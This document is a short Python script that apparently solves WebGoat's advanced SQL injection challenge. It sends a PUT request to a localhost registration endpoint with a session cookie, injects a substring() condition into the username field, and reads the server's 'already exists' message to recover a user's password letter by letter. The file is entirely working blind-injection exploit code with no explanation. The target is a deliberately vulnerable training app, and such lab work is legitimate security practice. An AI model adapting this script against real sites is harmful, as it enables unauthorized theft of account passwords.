import json  
import requests  
  
def attack():  
     alphabet_index = 0  
     alphabet = 'abcdefghijklmnopqrstuvwxyz'  
     password_index = 0  
     password = ''  
  
     headers = {  
        'Cookie':"JSESSIONID=wn8Zy2dS4glMFQCywE5LxupCLAHoz-V3icIyX4Ll",  
     }  
  
     while True:  
         payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])  
  
         data = {  
             'username_reg': payload,  
             'email_reg': 'a@a',  
             'password_reg': 'a',  
             'confirm_password_reg': 'a'  
         }  
  
         r = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
  
         try:  
             response = json.loads(r.text)  
         except:  
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
             return  
  
         if "already exists please try to register with a different username" not in response['feedback']:  
             alphabet_index += 1  
             if alphabet_index > len(alphabet) - 1:  
                 return  
         else:  
             password += alphabet[alphabet_index]  
             print(password)  
             alphabet_index = 0  
             password_index += 1  
  
attack()
